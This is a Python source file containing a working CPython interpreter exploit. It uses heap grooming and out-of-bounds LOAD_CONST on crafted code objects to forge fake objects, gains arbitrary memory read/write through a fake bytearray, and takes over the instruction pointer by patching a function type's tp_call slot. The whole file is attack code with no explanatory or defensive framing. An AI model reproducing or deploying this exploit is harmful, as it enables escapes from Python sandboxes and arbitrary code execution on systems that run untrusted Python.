#import nothing

nullfunc = lambda: None

#from types import CodeType, FunctionType
CodeType = nullfunc.__code__.__class__
FunctionType = nullfunc.__class__


IS_PY2 = not 2/3
BYTES_HEADER_LEN = 0x24 if IS_PY2 else 0x20
TUPLE_HEADER_LEN = 0x18

INT64_MAX =  (1<<63)-1
INT32_MAX =  (1<<31)-1
INT32_MIN = -(1<<31)

if IS_PY2:
	def bytes(arr):
		if type(arr) is int:
			return "\0" * arr
		return "".join(map(chr, arr)) # ewwww

nogc = set()  # things we want to keep a reference to, to prevent gc


def p64a(*n):
	return [(a >> i) & 0xFF for a in n for i in range(0, 64, 8)]


def addrof(obj):
	return id(obj)


def refbytes(data):
	# get the address of the internal buffer of a bytes object
	nogc.add(data) # unnecessary?
	return addrof(data) + BYTES_HEADER_LEN


def get_aligned_tuple_and_bytes(prefix):
	its_per_size = 4
	tuples = []
	byteses = []  # the plural of bytes is byteses, obviously
	for size in range(8, 64)[::-1]:
		tupletemplate = range(size)
		suffix =  b"A"*(size*8-len(prefix))
		for _ in range(its_per_size):
			tuples.append(tuple(tupletemplate))
			byteses.append(prefix + suffix)
	
	bestdist = 99999999999
	besttuple = None
	bestbytes = None
	pairs = [(t, b) for t in tuples for b in byteses]
	for t, b in pairs:
		dist = addrof(b)-addrof(t)
		if dist > 0 and dist < bestdist:
			bestdist = dist
			besttuple = t
			bestbytes = b
	
	if bestdist > 100000:
		raise Exception("Heap groom failed: Could not allocate bytes near enough to tuple", hex(bestdist))
	
	return(besttuple, bestbytes)


# generate a function that effectively does LOAD_CONST(n)
def load_n(n):
	return eval("lambda: %s if None else %s" % (list(range(1,n)), n))


def replace_code_consts(codeobj, consts):
	# in python3.8+ this can be implemented as:
	# return codeobj.replace(co_consts=consts)
	code_args = []
	argnames = CodeType.__doc__.split("(")[1].split("[")[0].split(",")
	for argname in argnames:
		argname = argname.strip()
		
		if argname == "codestring":
			argname = "code"
		
		if argname == "constants":
			code_args.append(consts)
		else:
			code_args.append(getattr(codeobj, "co_"+argname))

	return CodeType(*code_args)


def fakeobj(addr):
	fake_bytearray_ptr = bytes(p64a(addr))

	if IS_PY2: # pad to 8-byte multiple
		fake_bytearray_ptr = b"AAAA" + fake_bytearray_ptr

	nogc.add(fake_bytearray_ptr)  # if this bytearray gets freed, bad things might happen

	const_tuple, fake_bytearray_ref = get_aligned_tuple_and_bytes(fake_bytearray_ptr)

	nogc.add(fake_bytearray_ref)  # likewise

	const_tuple_array_start = addrof(const_tuple) + TUPLE_HEADER_LEN
	fake_bytearray_ref_addr = refbytes(fake_bytearray_ref)

	if IS_PY2: # account for padding
		fake_bytearray_ref_addr += 4

	offset = (fake_bytearray_ref_addr - const_tuple_array_start) // 8

	assert(INT32_MIN <= offset <= INT32_MAX)

	loader_code = load_n(offset).__code__
	newcode = replace_code_consts(loader_code, const_tuple)

	makemagic = FunctionType(newcode, {})

	magic = makemagic()
	return magic


mem = None # cache the result
def getmem():
	global mem
	if mem:
		return mem
	
	fake_bytearray = bytes(p64a(
		1,
		id(bytearray),
		INT64_MAX,
		0, 0, 0, 0
	))
	
	mem = fakeobj(refbytes(fake_bytearray))
	return mem


def setrip(addr):
	# make a copy of the built-in function type object
	my_functype = getmem()[id(FunctionType):id(FunctionType)+0x800]

	# patch tp_call
	my_functype[0x80:0x88] = p64a(addr)

	# get a pointer to our patched function type
	my_functype_ptr = refbytes(bytes(my_functype))

	# create an instance of our custom function object
	my_func_ptr = refbytes(bytes(p64a(0xcafebabe-2, my_functype_ptr))+bytes(0x100))
	my_func = fakeobj(my_func_ptr)

	# call it!
	return my_func()
